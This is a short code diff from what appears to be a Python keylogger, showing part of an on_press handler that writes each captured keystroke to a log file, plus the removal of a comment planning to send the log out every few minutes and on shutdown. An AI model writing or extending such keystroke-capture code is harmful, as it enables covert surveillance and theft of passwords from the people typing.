@@ -36,15 +36,12 @@ def on_press(key):
 				space = " "
 				key = space
 				log.write(str(key))
-
-
+			
 			else:
 				log.write(str(key).replace("'",""))
 
 
 
-	#make a function that will send the file updating it every n minutes and if the computer is shutting down or restarting  aswell
-	
 
 	except AttributeError:
 		pass
